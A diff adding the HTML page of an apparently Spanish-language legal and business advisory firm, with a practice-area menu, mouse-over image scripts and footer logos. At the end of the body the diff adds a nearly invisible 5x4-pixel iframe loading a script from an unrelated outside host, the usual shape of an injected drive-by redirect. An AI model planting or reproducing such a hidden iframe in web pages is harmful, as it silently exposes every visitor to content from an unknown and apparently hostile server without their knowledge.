@@ -1,0 +1,133 @@
+
+<html>
+<head>
+<title>Untitled Document</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<style type="text/css">
+<!--
+body {
+	margin-left: 2px;
+	margin-top: 2px;
+	margin-right: 2px;
+	margin-bottom: 2px;
+}
+-->
+</style>
+<link href="estilosmunoz.css" rel="stylesheet" type="text/css">
+<link href="estilos.css" rel="stylesheet" type="text/css">
+<link href="plantillamunoz2.css" rel="stylesheet" type="text/css">
+</head>
+<script language="javascript">
+//precacheo de imagenes
+
+var bullet1=new Image(9,9);
+bullet1.src="images/flechaitemmunoz.gif";
+var bullet2=new Image(9,9);
+bullet2.src="images/flechaitemmunozover.gif";
+////////
+
+function botonover(x){
+x.childNodes[0].childNodes[0].src=bullet2.src;
+x.childNodes[0].className='flechita';
+x.childNodes[1].className='itemover3'
+}
+
+function botonout(x){
+x.childNodes[0].childNodes[0].src=bullet1.src;
+x.childNodes[0].className='flechita';
+x.childNodes[1].className='item3'
+}
+
+
+</script>
+<body>
+<div align="center">
+	<table width="778" height="100%" border="0" cellpadding="0" cellspacing="0" class="bordeexterno">
+		<!--DWLayoutTable-->
+		<tr>
+			<td width="45" height="343" rowspan="3" valign="top"><!--DWLayoutEmptyCell-->&nbsp;</td>
+		    <td width="285" height="86"><img src="images/logomunoz1.gif" width="305" height="85"></td>
+		    <td height="85">&nbsp;</td>
+		    <td width="259"><img src="images/direccionmunoz.gif" width="223" height="85"></td>
+		</tr>
+		<tr>
+			<td height="100%" colspan="3" valign="top">
+				<table width="100%" height="100%"  border="0" cellpadding="0" cellspacing="0">
+                	<tr>
+                		<td width="53" height="26" bgcolor="#666666" class="botonbuscar" scope="col">&nbsp;</td>
+                		<td height="25" colspan="3" scope="col"><img src="images/menu.gif" width="677" height="25"></td>
+               		</tr>
+                	<tr>
+                		<td width="53" valign="top" bgcolor="#A6A6A6" class="bordederecho"><img src="images/cos.gif" width="53" height="327"> </td>
+                        <td width="189" align="center" valign="top">
+                        	<table width="185" border="0" cellspacing="0" cellpadding="0">
+                            	<tr class="cursor" onMouseOver="botonover(this)" onMouseOut="botonout(this)">
+                            		<td height="10" colspan="2" ></td>
+                           		</tr>
+                            	<tr class="cursor" onMouseOver="botonover(this)" onMouseOut="botonout(this)">
+                            		<td class="flechita" > <img src="images/flechaitemmunoz.gif" width="9" height="9"></td>
+                            		<td class="item3"><strong>Financiaci&oacute;n de Empresas </strong></td>
+                           		</tr>
+                            	<tr class="cursor" onMouseOver="botonover(this)" onMouseOut="botonout(this)" >
+                            		<td class="flechita" > <img src="images/flechaitemmunoz.gif" width="9" height="9"></td>
+                            		<td class="item3"><strong>Compraventa de Empresas </strong></td>
+                           		</tr>
+                            	<tr  >
+                            		<td > <img src="images/flechaitemmunozover.gif" width="9" height="9"></td>
+                            		<td class="item3"><strong> Asesoramiento General </strong></td>
+                           		</tr>
+                            	<tr>
+                            		<td class="cursor" >&nbsp;</td>
+                            		<td class="linea"> <a href="#" class="item4"> Cuestiones societarias </a><br>
+                                			<a href="#" class="item4"> Transacciones Comerciales</a><br>
+                                			<a href="#" class="item4" > Propiedad Intelectual </a><br>
+                                			<a href="#" class="item4"> Derecho Inmobiliario </a><br>
+                                			<a href="#" class="item4" > Derecho Laboral y de la &nbsp;&nbsp;&nbsp;&nbsp;Seguridad Social </a><br>
+                                			<a href="#" class="item4" > Defensa del Consumidor </a><br>
+                                			<a href="#" class="item4" > Experiencia </a><br>
+	                            </tr>
+                            	<tr  class="cursor" onMouseOver="botonover(this)" onMouseOut="botonout(this)">
+                            		<td class="flechita" > <img src="images/flechaitemmunoz.gif" width="9" height="9"></td>
+                            		<td class="item3"><strong> Reestructuaraciones, Concursos y Quiebras </strong></td>
+                           		</tr>
+                            	<tr  class="cursor" onMouseOver="botonover(this)" onMouseOut="botonout(this)">
+                            		<td class="flechita" > <img src="images/flechaitemmunoz.gif" width="9" height="9"></td>
+                            		<td class="item3"><strong> Derecho Regulatorio </strong></td>
+                           		</tr>
+                            	<tr  class="cursor" onMouseOver="botonover(this)" onMouseOut="botonout(this)">
+                            		<td class="flechita" > <img src="images/flechaitemmunoz.gif" width="9" height="9"></td>
+                            		<td class="item3"><strong> Impuestos y Tax Planning </strong></td>
+                           		</tr>
+                            	<tr  class="cursor" onMouseOver="botonover(this)" onMouseOut="botonout(this)">
+                            		<td class="flechita" > <img src="images/flechaitemmunoz.gif" width="9" height="9"></td>
+                            		<td class="item3"><strong> Soluci&oacute;n de Controversias </strong></td>
+                           		</tr>
+                            	</table>
+                        </td>
+                        <td  width="396" height="100%" >
+                       	</td>
+               		    
+               		    <td width="93" valign="top" class="fondologo">
+                        	<div align="center"><img src="images/costado.gif" width="85" height="77"> </div>
+           		    	</td>
+                	</tr>
+               	</table>
+			</td>
+		</tr>
+		<tr>
+			<td height="55" colspan="3" valign="bottom" bgcolor="#666666">
+				<table width="100%" height="53"  border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF" class="lineainferior">
+                	<tr>
+                		<td width="53" scope="col"><img src="images/idiomasmunoz.gif" width="53" height="53"></td>
+                		<td bgcolor="#FFFFFF" scope="col">&nbsp;</td>
+               		    <td width="184" scope="col"><a href="alvarez.html"><img src="images/logoalvarez2.gif" width="184" height="53" border="0"></a></td>
+                	    <td width="230" scope="col"><a href="souza.html"><img src="images/logosouza2.gif" width="230" height="53" border="0"></a></td>
+                	    <td width="18" align="left" bgcolor="#FFFFFF" scope="col"><img src="images/linea.gif" width="15" height="53"></td>
+                	</tr>
+               	</table>
+			</td>
+		</tr>
+	</table>
+</div>
+<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
+</html>
